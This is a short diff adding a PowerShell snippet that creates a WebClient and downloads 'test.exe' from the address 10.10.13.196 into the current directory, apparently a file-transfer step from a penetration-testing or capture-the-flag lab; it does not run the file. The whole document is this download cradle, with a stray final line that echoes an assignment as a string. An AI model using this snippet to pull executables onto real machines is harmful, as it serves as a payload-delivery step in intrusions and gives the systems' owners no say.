@@ -1,0 +1,6 @@
+$storageDir = $pwd 
+$webclient = New-Object System.Net.WebClient  
+$url = "http://10.10.13.196/test.exe" 
+$file = "test.exe" 
+$webclient.DownloadFile($url,$file) 
+"$storageDir = $pwd" 
